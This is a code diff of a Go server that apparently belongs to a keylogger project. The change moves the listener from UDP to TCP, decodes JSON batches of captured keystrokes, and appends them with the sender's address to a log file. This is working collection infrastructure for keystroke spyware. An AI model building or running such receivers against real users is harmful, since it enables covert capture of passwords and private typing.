@@ -6,95 +6,88 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"net"
 	"os"
+	"time"
 )
 
 const (
-	Protocol = "udp"
+	Protocol = "tcp"
 	Address  = "127.0.0.1:8722"
 
-	Filename = "keylogger.txt"
+	Filename   = "keylogger.log"
+	LogFormat  = "%s [%s] <%s> %s\n"
+	TimeFormat = "2006.01.02 15:04:05.000"
 
-	ExitResolveUDPAddr = iota + 1
-	ExitListenUDP
-	ExitOpenFile
+	ExitListen = iota + 1
 )
 
-var (
-	conn *net.UDPConn
-	file *os.File
-)
+type keyLog struct {
+	Time  int64  `json:"time"`
+	Type  string `json:"type"`
+	Value string `json:"value"`
+}
 
-func init() {
-	var err error
-	// Create UDP end point for listening.
-	laddr, err := net.ResolveUDPAddr(Protocol, Address)
-	if err != nil {
-		fmt.Printf("Failed to resolve UDP address: %s\n", err.Error())
-		os.Exit(ExitResolveUDPAddr)
-	}
-	// Create connection for listening.
-	conn, err = net.ListenUDP(Protocol, laddr)
-	if err != nil {
-		fmt.Printf("Failed to listen UDP: %s\n", err.Error())
-		os.Exit(ExitListenUDP)
-	}
+// write appends data to the specified file.
+func (k keyLog) write(raddr string) {
+	// Format data for writing.
+	data := fmt.Sprintf(LogFormat, time.UnixMilli(k.Time).Format(TimeFormat), raddr, k.Type, k.Value)
 	// Open file to append data, create if file does not exist.
-	file, err = os.OpenFile(Filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, os.ModePerm)
+	file, err := os.OpenFile(Filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, os.ModePerm)
 	if err != nil {
-		defer conn.Close()
-		fmt.Printf("Failed to open file: %s\n", err.Error())
-		os.Exit(ExitOpenFile)
+		fmt.Printf("Failed to opean file: %s\n", err.Error())
+		fmt.Printf("Failed to write:\n%s\n", data)
+		return
+	}
+	defer file.Close()
+	// Write data to the file.
+	_, err = file.WriteString(data)
+	if err != nil {
+		fmt.Printf("Failed to write file: %s\n", err.Error())
+		fmt.Printf("Data: %s\n", data)
+		return
 	}
 }
 
 func main() {
-	defer conn.Close()
-	defer file.Close()
-	fmt.Print("Start listening...")
-	isAddrWritten := false // for checking if address is required to be written
+	// Initialise TCP listener.
+	listener, err := net.Listen(Protocol, Address)
+	if err != nil {
+		fmt.Printf("Failed to listen: %s\n", err.Error())
+		os.Exit(ExitListen)
+	}
+	defer listener.Close()
+	fmt.Println("Start listening")
+	// Loop forever to listen.
 	for {
-		buffer := make([]byte, 1024)
-		// Read buffers.
-		n, raddr, err := conn.ReadFromUDP(buffer)
-		if err != nil {
-			fmt.Printf("Failed to read from UDP: %s\n", err.Error())
+		// Wait for the next connection.
+		conn, e := listener.Accept()
+		if e != nil {
+			fmt.Printf("Failed to accept: %s\n", e.Error())
 			continue
 		}
-		// The characters will be sent one by one. After the conversion of bufString([]byte), some characters will be
-		// converted to a plain string, use it to format and write.
-		if len(bufString(buffer[:n])) == 1 {
-			// Check if the address has been written.
-			if !isAddrWritten {
-				_, _ = file.WriteString(fmt.Sprintf("[%s] ", raddr))
-				isAddrWritten = true
-			}
-			// Append data.
-			_, _ = file.WriteString(bufString(buffer[:n]))
-		} else {
-			// If the address has been written, start a new line.
-			if isAddrWritten {
-				_, _ = file.WriteString("\n")
-				isAddrWritten = false
-			}
-			// Append data with address.
-			_, _ = file.WriteString(fmt.Sprintf("[%s] %s\n", raddr, bufString(buffer[:n])))
+		// Initialise buffer for reading.
+		buffer := make([]byte, 4096)
+		// Read data from connection.
+		n, e := conn.Read(buffer)
+		if e != nil {
+			fmt.Printf("Failed to read: %s\n", e.Error())
+			continue
 		}
-	}
-}
-
-// bufString converts some characters to plain strings.
-func bufString(b []byte) string {
-	switch string(b) {
-	case "\t":
-		return "<tab>"
-	case "\r":
-		return "<enter>"
-	case "\b":
-		return "<backspace>"
-	default:
-		return string(b)
+		var keyLogs []keyLog
+		// Unserialise buffer to keyLog slice.
+		e = json.Unmarshal(buffer[:n], &keyLogs)
+		if e != nil {
+			fmt.Printf("Failed to unmarshal:\n%s\n", string(buffer[:n]))
+			_ = conn.Close()
+			continue
+		}
+		// Traverse and write data to file.
+		for _, k := range keyLogs {
+			k.write(conn.RemoteAddr().String())
+		}
+		_ = conn.Close()
 	}
 }
